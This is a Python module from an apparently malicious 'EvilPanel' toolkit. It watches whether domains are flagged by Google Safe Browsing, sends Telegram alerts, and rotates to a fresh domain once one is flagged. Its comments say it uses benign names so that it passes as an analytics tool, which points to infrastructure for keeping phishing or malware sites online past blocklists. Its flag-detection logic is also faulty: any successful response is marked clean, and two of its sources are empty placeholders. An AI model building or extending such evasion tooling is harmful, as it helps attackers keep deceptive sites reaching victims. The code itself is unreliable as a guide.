"""
GSB (Google Safe Browsing) Monitor Module
Monitors domain flagging status and triggers alerts/rotation

OPSEC: Uses benign function names and silent operation
"""

import hashlib
import time
import threading
from typing import Dict, List, Optional, Callable
from pathlib import Path
import json
from datetime import datetime


class DomainStatusChecker:
    """
    Checks domain status against multiple threat intelligence sources
    Uses benign naming - appears as a domain analytics tool
    """
    
    # Status constants
    STATUS_CLEAN = "clean"
    STATUS_FLAGGED = "flagged"
    STATUS_UNKNOWN = "unknown"
    STATUS_ERROR = "error"
    
    def __init__(self, config_path: Optional[str] = None):
        self.config_path = config_path or "/opt/evilpanel/config/domains.yaml"
        self._last_check: Dict[str, datetime] = {}
        self._status_cache: Dict[str, Dict] = {}
        self._check_interval = 21600  # 6 hours in seconds
        self._callbacks: List[Callable] = []
        self._running = False
        self._thread: Optional[threading.Thread] = None
        
    def add_status_callback(self, callback: Callable) -> None:
        """Register callback for status changes"""
        self._callbacks.append(callback)
        
    def _notify_callbacks(self, domain: str, status: Dict) -> None:
        """Notify all registered callbacks of status change"""
        for callback in self._callbacks:
            try:
                callback(domain, status)
            except Exception:
                pass  # Silent failure
                
    def _calculate_hash_prefix(self, url: str) -> str:
        """
        Calculate URL hash prefix for GSB lookup
        GSB uses SHA256 hash prefixes (4 bytes) for privacy
        """
        # Normalize URL
        normalized = url.lower().strip()
        if not normalized.startswith(('http://', 'https://')):
            normalized = f"https://{normalized}/"
            
        # Calculate SHA256 and return 4-byte prefix
        full_hash = hashlib.sha256(normalized.encode()).hexdigest()
        return full_hash[:8]  # 4 bytes = 8 hex chars
        
    def check_gsb_status(self, domain: str) -> Dict:
        """
        Check domain against Google Safe Browsing
        
        Note: This uses the GSB Lookup API which requires API key
        For production, implement proper API integration
        
        Returns:
            Dict with status, threats, and timestamp
        """
        try:
            import requests
        except ImportError:
            return {
                "domain": domain,
                "status": self.STATUS_ERROR,
                "error": "requests module not available",
                "timestamp": datetime.now().isoformat()
            }
            
        # Check cache first
        cache_key = f"gsb_{domain}"
        if cache_key in self._status_cache:
            cached = self._status_cache[cache_key]
            cache_age = (datetime.now() - datetime.fromisoformat(cached["timestamp"])).seconds
            if cache_age < self._check_interval:
                return cached
                
        result = {
            "domain": domain,
            "status": self.STATUS_UNKNOWN,
            "threats": [],
            "timestamp": datetime.now().isoformat(),
            "source": "gsb"
        }
        
        # GSB Lookup API endpoint
        # Note: Requires GSB API key for production use
        # This is a placeholder for the integration
        try:
            # Alternative: Use transparency report as fallback
            check_url = f"https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site={domain}"
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            response = requests.get(check_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                # Parse response - transparency report returns specific format
                data = response.text
                
                # Check for flagging indicators
                if "SOCIAL_ENGINEERING" in data or "MALWARE" in data or "UNWANTED_SOFTWARE" in data:
                    result["status"] = self.STATUS_FLAGGED
                    result["threats"] = ["POTENTIAL_FLAG_DETECTED"]
                elif "No unsafe content found" in data or response.status_code == 200:
                    result["status"] = self.STATUS_CLEAN
                else:
                    result["status"] = self.STATUS_UNKNOWN
                    
        except requests.RequestException:
            result["status"] = self.STATUS_ERROR
            result["error"] = "Network error during check"
        except Exception:
            result["status"] = self.STATUS_ERROR
            
        # Update cache
        self._status_cache[cache_key] = result
        self._last_check[domain] = datetime.now()
        
        return result
        
    def check_virustotal_status(self, domain: str) -> Dict:
        """
        Check domain against VirusTotal
        
        Note: Requires VT API key for full functionality
        """
        result = {
            "domain": domain,
            "status": self.STATUS_UNKNOWN,
            "positives": 0,
            "total": 0,
            "timestamp": datetime.now().isoformat(),
            "source": "virustotal"
        }
        
        # Placeholder for VT API integration
        # In production, use VT API v3
        
        return result
        
    def check_phishtank_status(self, domain: str) -> Dict:
        """
        Check domain against PhishTank
        """
        result = {
            "domain": domain,
            "status": self.STATUS_UNKNOWN,
            "in_database": False,
            "verified": False,
            "timestamp": datetime.now().isoformat(),
            "source": "phishtank"
        }
        
        # Placeholder for PhishTank API integration
        
        return result
        
    def check_all_sources(self, domain: str) -> Dict:
        """
        Check domain against all available sources
        
        Returns aggregated status
        """
        results = {
            "domain": domain,
            "timestamp": datetime.now().isoformat(),
            "overall_status": self.STATUS_CLEAN,
            "sources": {}
        }
        
        # Check each source
        gsb_result = self.check_gsb_status(domain)
        results["sources"]["gsb"] = gsb_result
        
        # Aggregate status - any flagged = overall flagged
        if gsb_result["status"] == self.STATUS_FLAGGED:
            results["overall_status"] = self.STATUS_FLAGGED
            
        return results
        
    def is_flagged(self, domain: str) -> bool:
        """
        Quick check if domain is flagged
        
        Returns:
            True if any source reports flagging
        """
        result = self.check_all_sources(domain)
        return result["overall_status"] == self.STATUS_FLAGGED
        
    def start_monitoring(self, domains: List[str]) -> None:
        """
        Start background monitoring thread
        
        Checks domains every 6 hours and triggers callbacks on status change
        """
        if self._running:
            return
            
        self._running = True
        self._thread = threading.Thread(
            target=self._monitoring_loop,
            args=(domains,),
            daemon=True
        )
        self._thread.start()
        
    def stop_monitoring(self) -> None:
        """Stop background monitoring"""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
            
    def _monitoring_loop(self, domains: List[str]) -> None:
        """Background monitoring loop"""
        while self._running:
            for domain in domains:
                if not self._running:
                    break
                    
                try:
                    # Check domain status
                    previous_status = self._status_cache.get(f"gsb_{domain}", {}).get("status")
                    current = self.check_all_sources(domain)
                    
                    # Notify on status change
                    if previous_status and previous_status != current["overall_status"]:
                        self._notify_callbacks(domain, current)
                        
                    # If flagged, notify immediately
                    if current["overall_status"] == self.STATUS_FLAGGED:
                        self._notify_callbacks(domain, current)
                        
                except Exception:
                    pass  # Silent failure
                    
                # Small delay between domain checks
                time.sleep(5)
                
            # Wait for next check interval
            for _ in range(self._check_interval):
                if not self._running:
                    break
                time.sleep(1)


class DomainHealthMonitor:
    """
    High-level monitor that integrates with EvilPanel
    
    Features:
    - Periodic status checks
    - Telegram notifications on flagging
    - Integration with domain rotation
    """
    
    def __init__(self, telegram_notifier=None, domain_manager=None):
        self.checker = DomainStatusChecker()
        self.telegram = telegram_notifier
        self.domain_manager = domain_manager
        self._status_log_path = Path("/opt/evilpanel/logs/domain_status.json")
        
        # Register callback for status changes
        self.checker.add_status_callback(self._on_status_change)
        
    def _on_status_change(self, domain: str, status: Dict) -> None:
        """Handle domain status change"""
        # Log status change
        self._log_status(domain, status)
        
        # Send Telegram alert if flagged
        if status.get("overall_status") == DomainStatusChecker.STATUS_FLAGGED:
            self._send_flagging_alert(domain, status)
            
            # Trigger domain rotation if manager available
            if self.domain_manager:
                try:
                    self.domain_manager.rotate_domain(reason="flagged")
                except Exception:
                    pass  # Silent failure
                    
    def _send_flagging_alert(self, domain: str, status: Dict) -> None:
        """Send Telegram notification about flagging"""
        if not self.telegram:
            return
            
        try:
            message = (
                f"⚠️ *DOMAIN FLAGGING ALERT*\n\n"
                f"Domain: `{domain}`\n"
                f"Status: `{status.get('overall_status', 'unknown')}`\n"
                f"Time: `{status.get('timestamp', 'N/A')}`\n"
                f"Sources: {', '.join(status.get('sources', {}).keys())}\n\n"
                f"🔄 Domain rotation may be required."
            )
            self.telegram.send_message(message, parse_mode="Markdown")
        except Exception:
            pass  # Silent failure
            
    def _log_status(self, domain: str, status: Dict) -> None:
        """Log status to file"""
        try:
            self._status_log_path.parent.mkdir(parents=True, exist_ok=True)
            
            logs = []
            if self._status_log_path.exists():
                with open(self._status_log_path) as f:
                    logs = json.load(f)
                    
            logs.append({
                "domain": domain,
                "status": status,
                "logged_at": datetime.now().isoformat()
            })
            
            # Keep last 1000 entries
            logs = logs[-1000:]
            
            with open(self._status_log_path, 'w') as f:
                json.dump(logs, f, indent=2)
                
        except Exception:
            pass  # Silent failure
            
    def start(self, domains: List[str]) -> None:
        """Start monitoring specified domains"""
        self.checker.start_monitoring(domains)
        
    def stop(self) -> None:
        """Stop monitoring"""
        self.checker.stop_monitoring()
        
    def check_now(self, domain: str) -> Dict:
        """Perform immediate check"""
        return self.checker.check_all_sources(domain)
        
    def get_status_history(self, domain: Optional[str] = None) -> List[Dict]:
        """Get status history from logs"""
        try:
            if not self._status_log_path.exists():
                return []
                
            with open(self._status_log_path) as f:
                logs = json.load(f)
                
            if domain:
                return [l for l in logs if l.get("domain") == domain]
            return logs
            
        except Exception:
            return []


# CLI interface for manual checks
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python gsb_monitor.py <domain>")
        sys.exit(1)
        
    domain = sys.argv[1]
    checker = DomainStatusChecker()
    
    print(f"Checking {domain}...")
    result = checker.check_all_sources(domain)
    
    print(f"\nDomain: {result['domain']}")
    print(f"Status: {result['overall_status']}")
    print(f"Timestamp: {result['timestamp']}")
    print(f"\nSources checked:")
    for source, data in result.get("sources", {}).items():
        print(f"  - {source}: {data.get('status', 'unknown')}")
